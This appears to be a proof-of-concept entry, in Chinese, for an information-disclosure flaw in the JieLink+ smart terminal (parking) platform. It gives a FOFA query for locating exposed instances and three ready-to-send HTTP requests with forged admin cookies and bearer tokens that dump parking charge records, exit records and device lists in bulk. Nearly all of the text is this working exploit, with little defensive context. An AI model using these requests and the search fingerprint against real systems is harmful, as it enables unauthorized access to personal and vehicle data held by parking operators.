## JieLink+智能终端操作平台多个接口处存在敏感信息泄露漏洞

JieLink+智能终端操作平台多个接口处存在敏感信息泄露漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

## fofa

```yaml
title="JieLink+智能终端操作平台"
```

## poc

```
POST /report/ParkChargeRecord/GetDataList HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, \*/\*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization: Bearer test
Cookie: JSESSIONID=test;UUID=1; userid=admin
X-Requested-With: XMLHttpRequest
Content-Length: 21
Origin: http://x.xx.xx.x:xxx
Connection: close
Referer: http://x.xx.xx.x:xxx/Report/ParkOutRecord/Index
Sec-GPC: 1
Priority: u=1

page=1&rows=20000
```

```
GET /Report/ParkCommon/GetParkInThroughDeivces HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, \*/\*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Origin:
Connection: close
Referer:
Sec-GPC: 1
```

```
GET /report/ParkOutRecord/GetDataList HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, \*/\*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization: Bearer test
Cookie: JSESSIONID=test;UUID=1; userid=admin
X-Requested-With: XMLHttpRequest
Content-Length: 2
Origin:
Connection: close
Referer:
Sec-GPC: 1
Priority: u=1
```

![image-20240820094038330](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408200941857.png)